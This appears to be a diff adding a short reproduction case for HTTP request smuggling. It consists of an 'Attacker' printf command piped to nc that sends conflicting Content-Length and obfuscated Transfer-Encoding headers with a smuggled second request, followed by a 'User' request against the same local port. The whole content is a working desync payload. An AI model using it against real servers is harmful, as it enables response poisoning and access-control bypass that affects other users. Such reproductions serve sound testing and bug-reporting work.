@@ -1,0 +1,23 @@
+
+Attacker 
+
+printf 'GET / HTTP/1.1\r\n'\
+'Host: 127.0.0.1:1080\r\n'\
+'Content-Length: 45\r\n'\
+'Connection: keep-alive\r\n'\
+'Transfer-Encoding:\x0b chunked\r\n'\
+'\r\n'\
+'1\r\n'\
+'A\r\n'\
+'0\r\n'\
+'\r\n'\
+'GET /notfound HTTP/1.1\r\n'\
+'X-Foo: bar' | nc localhost 9013
+
+User
+
+printf 'GET / HTTP/1.1\r\n'\
+'Host: 127.0.0.1:1080\r\n'\
+'Connection: close\r\n'\
+'\r\n' | nc localhost 9013
+
